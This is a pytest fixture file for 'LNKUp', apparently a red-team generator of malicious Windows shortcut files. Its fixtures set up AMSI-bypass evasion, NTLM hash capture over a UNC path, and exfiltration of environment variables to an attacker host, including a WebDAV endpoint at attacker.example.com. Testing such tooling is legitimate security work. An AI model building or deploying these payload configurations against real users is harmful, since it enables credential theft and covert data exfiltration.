"""
Pytest configuration and fixtures for LNKUp testing
"""

import pytest
import sys
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from generate_new import (
    PayloadConfig,
    EvasionConfig,
    ExfiltrationMethod,
    EvasionEngine,
    Exfiltrator,
    LNKGenerator
)


@pytest.fixture
def test_output_dir(tmp_path):
    """Create temporary output directory for tests"""
    output_dir = tmp_path / "test_output"
    output_dir.mkdir()
    return output_dir


@pytest.fixture
def basic_evasion_config():
    """Basic evasion configuration for testing"""
    return EvasionConfig(
        anti_amsi=True,
        anti_etw=False,
        jitter_min=0,
        jitter_max=1000,
        fake_timestamp=None,
        randomize_size=False,
        legitimate_target=False
    )


@pytest.fixture
def basic_exfil_method():
    """Basic exfiltration method for testing"""
    return ExfiltrationMethod(
        type="unc",
        host="192.168.1.100",
        port=None,
        path=None,
        ssl=False,
        compress=True
    )


@pytest.fixture
def ntlm_payload_config(basic_evasion_config, basic_exfil_method):
    """NTLM capture payload configuration"""
    return PayloadConfig(
        target_command=["whoami"],
        exfil_methods=[basic_exfil_method],
        evasion=basic_evasion_config,
        additional_vars=[],
        ntlm_capture=True
    )


@pytest.fixture
def env_exfil_payload_config(basic_evasion_config, basic_exfil_method):
    """Environment exfiltration payload configuration"""
    return PayloadConfig(
        target_command=["whoami"],
        exfil_methods=[basic_exfil_method],
        evasion=basic_evasion_config,
        additional_vars=["USERNAME", "COMPUTERNAME"],
        ntlm_capture=False
    )


@pytest.fixture
def evasion_engine():
    """Evasion engine instance"""
    return EvasionEngine()


@pytest.fixture
def webdav_exfil_method():
    """WebDAV exfiltration method for testing"""
    return ExfiltrationMethod(
        type="http",
        host="attacker.example.com",
        port=443,
        path="/webdav",
        ssl=True,
        compress=False
    )
